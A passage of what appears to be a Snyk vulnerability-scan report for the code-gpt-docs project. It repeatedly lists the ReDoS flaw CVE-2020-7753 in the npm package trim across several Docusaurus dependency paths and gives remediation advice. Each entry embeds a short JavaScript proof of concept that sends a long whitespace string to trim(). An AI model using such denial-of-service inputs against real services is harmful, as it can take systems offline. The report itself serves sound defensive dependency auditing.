        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number 